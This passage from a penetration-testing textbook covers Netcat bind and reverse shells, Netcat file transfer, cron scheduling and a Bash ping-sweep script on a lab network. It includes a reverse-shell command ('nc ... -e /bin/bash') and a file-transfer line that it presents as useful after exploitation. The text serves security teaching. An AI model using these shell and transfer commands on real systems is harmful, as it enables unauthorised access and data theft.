root@kali:~# nc 192.168.20.9 1234
whoami
root
You can now issue Linux commands to be executed by the Netcat lis-
tener. The whoami Linux command will tell you the current logged-in user.
In this case, because the Netcat process was started by the root user, your
commands will be executed as root.
note This is a simple example because both your Netcat listener and the connection are on
the same system. You could use another of your virtual machines, or even your host
system, for this exercise as well.
Close down both Netcat processes again.
Pushing a Command Shell Back to a Listener
In addition to listening on a port with a command shell, you can also push
a command shell back to a Netcat listener. This time set up the Netcat lis-
tener without the -e flag as shown next.
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
Now open a second terminal, and connect back to the Netcat listener
you just created as shown here.
root@kali:~# nc 192.168.20.9 1234 -e /bin/bash
Connect with Netcat as usual, but this time use the -e flag to execute
/bin/bash on the connection. Back in your first terminal you see a connec-
tion as shown next, and if you enter terminal commands, you will see them
executed. (We’ll learn more about listening with /bin/bash on a local port
and actively pushing /bin/bash with a connection, known as bind shells and
reverse shells, respectively, in Chapter 4.)
listening on [any] 1234 ...
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51921
whoami
root
Now, one more thing with Netcat. This time, instead of outputting what
comes into your listener to the screen, use > to send it to a file as shown next.
root@kali:~# nc -lvp 1234 > netcatfile
listening on [any] 1234 ...
In the second terminal you set up Netcat to connect, but this time you
use the < symbol to tell it to send the contents of a file (myfile) over the
Using Kali Linux 71
Netcat connection. Give Netcat a second or two to finish, and then examine
the contents of the file netcatfile created by your first Netcat instance. The
contents should be identical to myfile.
root@kali:~# nc 192.168.20.9 1234 < mydirectory/myfile
You have used Netcat to transfer the file. In this case we’ve simply trans-
ferred the file from one directory to another, but you can imagine how this
technique can be used to transfer files from system to system—a technique
that often comes in handy in the post-exploitation phase of a pentest, once
you have access to a system.
automating tasks with cron Jobs
The cron command allows us to schedule tasks to automatically run at a
specified time. In the /etc directory in Kali, you can see several files and
directories related to cron, as shown in Listing 2-15.
root@kali:/etc# ls | grep cron
cron.d
cron.daily
cron.hourly
cron.monthly
crontab
cron.weekly
Listing 2-15: crontab files
The cron.daily, cron.hourly, cron.monthly, and cron.weekly directories spec-
ify scripts that will run automatically, every day, every hour, every month, or
every week, depending on which directory you put your script in.
If you need more flexibility you can edit cron’s configuration file, /etc/
crontab. The default text is shown in Listing 2-16.
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user command
17 * * * * root cd / && run-parts --report /etc/cron.hourly u
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) v
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
Listing 2-16: crontab configuration file
72 Chapter 2
The fields in a crontab are, from left to right, the minute, hour, day of
the month, month, day of the week, user who will run the command, and,
finally, the command to be run. To run a command every day of the week,
every hour, and so on, you use an asterisk (*) instead of specifying a value
for the column.
For example, look at the first crontab line at u, which runs the hourly
cron jobs specified in /etc/cron.hourly. This crontab runs on the 17th minute
of every hour every day of every month on every day of the week. The line
at v says that the daily crontab (/etc/cron.daily) will be run at the 25th min-
ute of the 6th hour of every day of every month on every day of the week. (For
more flexibility, you can add a line here instead of adding to the hourly, daily,
weekly, or monthly lists.)
summary
In this chapter we’ve looked at some common Linux tasks. Navigating the
Linux filesystem, working with data, and running services are all skills that
will serve you well as you move through the rest of this book. In addition,
when attacking Linux systems, knowing which commands to run in a Linux
environment will help you make the most of successful exploitation. You
may want to automatically run a command periodically by setting up a cron
job or use Netcat to transfer a file from your attack machine. You will use
Kali Linux to run your attacks throughout this book, and one of your target
systems is Ubuntu Linux, so having the basics in place will make learning
pentesting come more naturally.
Using Kali Linux 73
3
Progr amming
In this chapter we will look at some basic examples
of computer programming. We will look at writing
programs to automate various useful tasks in multiple
programming languages. Even though we use prebuilt
software for the majority of this book, it is useful to be
able to create your own programs.
Bash scripting
In this section we’ll look at using Bash scripts to run several commands
at once. Bash scripts, or shell scripts, are files that include multiple terminal
commands to be run. Any command we can run in a terminal can be run
in a script.
Ping
We’ll call our first script pingscript.sh. When it runs, this script will perform
a ping sweep on our local network that sends Internet Control Message
Protocol (ICMP) messages to remote systems to see if they respond.
We’ll use the ping tool to determine which hosts are reachable on a net-
work. (Although some hosts may not respond to ping requests and may be
up despite not being “pingable,” a ping sweep is still a good place to start.)
By default, we supply the IP address or hostname to ping. For example, to
ping our Windows XP target, enter the bold code in Listing 3-1.
root@kali:~/# ping 192.168.20.10
PING 192.168.20.10 (192.168.20.10) 56(84) bytes of data.
64 bytes from 192.168.20.10: icmp_req=1 ttl=64 time=0.090 ms
64 bytes from 192.168.20.10: icmp_req=2 ttl=64 time=0.029 ms
64 bytes from 192.168.20.10: icmp_req=3 ttl=64 time=0.038 ms
64 bytes from 192.168.20.10: icmp_req=4 ttl=64 time=0.050 ms
^C
--- 192.168.20.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999 ms
rtt min/avg/max/mdev = 0.029/0.051/0.090/0.024 ms
Listing 3-1: Pinging a remote host
We can tell from the ping output that the Windows XP target is up
and responding to ping probes because we received replies to our ICMP
requests. (The trouble with ping is that it will keep running forever unless
you stop it with ctrl-C.)
A Simple Bash Script
Let’s begin writing a simple Bash script to ping hosts on the network. A good
place to start is by adding some help information that tells your users how
to run your script correctly.
#!/bin/bash
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
The first line of this script tells the terminal to use the Bash interpreter.
The next two lines that begin with echo simply tell the user that our ping
script will take a command line argument (network), telling the script which
network to ping sweep (for example, 192.168.20). The echo command will
simply print the text in quotes.
note This script implies we are working with a class C network, where the first three octets
of the IP address make up the network.
After creating the script, use chmod to make it executable so we can run it.
root@kali:~/# chmod 744 pingscript.sh
76 Chapter 3
Running Our Script
Previously, when entering Linux commands, we typed the command
name at the prompt. The filesystem location of built-in Linux commands
as well as pentest tools added to Kali Linux are part of our PATH environ-
mental variable. The PATH variable tells Linux which directories to search
for executable files. To see which directories are included in our PATH,
enter echo $PATH.
root@kali:~/# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
Notice in the output that the /root directory is not listed. That means that
we won’t be able to simply enter pingscript.sh to run our Bash script. Instead
we’ll enter ./pingscript.sh to tell the terminal to run the script from our
current directory. As shown next, the script prints the usage information.
root@kali:~/# ./pingscript.sh
Usage: ./pingscript.sh [network]
example: ./pingscript.sh 192.168.20
Adding Functionality with if Statements
Now let’s add in a bit more functionality with an if statement, as shown in
Listing 3-2.
#!/bin/bash
if [ "$1" == "" ] u
then v
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
fi w
Listing 3-2: Adding an if statement
Typically a script needs to print usage information only if the user
uses it incorrectly. In this case, the user needs to supply the network to
scan as a command line argument. If the user fails to do so, we want to
inform the user how to run our script correctly by printing the usage
information.
To accomplish this, we can use an if statement to see if a condition is
met. By using an if statement, we can have our script echo the usage infor-
mation only under certain conditions—for example, if the user does not
supply a command line argument.
The if statement is available in many programming languages, though
the syntax varies from language to language. In Bash scripting, an if state-
ment is used like this: if [condition], where condition is the condition that
must be met.
Programming 77
In the case of our script, we first see whether the first command line
argument is null u. The symbol $1 represents the first command line argu-
ment in a Bash script, and double equal signs (==) check for equality. After
the if statement, we have a then statement v. Any commands between the
then statement and the fi (if backward) w are executed only if the condi-
tional statement is true—in this case, when the first command line argu-
ment to the script is null.
When we run our new script with no command line argument, the if
statement evaluates as true, because the first command line argument is
indeed null, as shown here.
root@kali:~/# ./pingscript.sh
Usage: ./pingscript.sh [network]
example: ./pingscript.sh 192.168.20
As expected we see usage information echoed to the screen.
A for Loop
If we run the script again with a command line argument, nothing hap-
pens. Now let’s add some functionality that is triggered when the user runs
the script with the proper arguments, as shown in Listing 3-3.
#!/bin/bash
if [ "$1" == "" ]
then
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
else u
for x in `seq 1 254`; do v
ping -c 1 $1.$x
done w
fi
Listing 3-3: Adding a for loop
After our then statement, we use an else statement u to instruct the
script to run code when the if statement evaluates as false—in this case, if
the user supplies a command line argument. Because we want this script
to ping all possible hosts on the local network, we need to loop through
the numbers 1 through 254 (the possibilities for the final octet of an
IP version 4 address) and run the ping command against each of these
possibilities.
An ideal way to run through sequential possibilities is with a for loop v.
Our for loop, for x in `seq 1 254`; do, tells the script to run the code that
follows for each number from 1 to 254. This will allow us to run one set of
instructions 254 times rather than writing out code for each instance. We
denote the end of a for loop with the instruction done w.
78 Chapter 3
Inside the for loop, we want to ping each of the IP addresses in the net-
work. Using ping’s man page, we find that the -c option will allow us to limit
the number of times we ping a host. We set -c to 1 so that each host will be
pinged just once.
To specify which host to ping, we want to concatenate the first command
line argument (which denotes the first three octets) with the current itera-
tion of the for loop. The full command to use is ping -c 1 $1.$x. Recall
that the $1 denotes the first command line argument, and $x is the cur-
rent iteration of the for loop. The first time our for loop runs, it will ping
192.168.20.1, then 192.168.20.2, all the way to 192.168.20.254. After itera-
tion 254, our for loop finishes.
When we run our script with the first three octets of our IP address as
the command line argument, the script pings each IP address in the net-
work as shown in Listing 3-4.
root@kali:~/# ./pingscript.sh 192.168.20
PING 192.168.20.1 (192.168.20.1) 56(84) bytes of data.
64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=8.31 ms u
--- 192.168.20.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 8.317/8.317/8.317/0.000 ms
PING 192.168.20.2(192.168.20.2) 56(84) bytes of data.
64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=166 ms
--- 192.168.20.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 166.869/166.869/166.869/0.000 ms
PING 192.168.20.3 (192.168.20.3) 56(84) bytes of data.
From 192.168.20.13 icmp_seq=1 Destination Host Unreachable v
--- 192.168.20.3 ping statistics ---
1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms
--snip--
Listing 3-4: Running the ping sweep script
Your results will vary based on the systems in your local network. Based
on this output, I can tell that in my network, the host 192.168.20.1 is up, and
I received an ICMP reply u. On the other hand, the host 192.168.20.3 is not
up, so I received a host unreachable notification v.
Streamlining the Results
All this information printed to screen is not very nice to look at, and anyone
who uses our script will need to sift through a lot of information to deter-
mine which hosts in the network are up. Let’s add some additional func-
tionality to streamline our results.
Programming 79
In the previous chapter we covered grep, which searches for and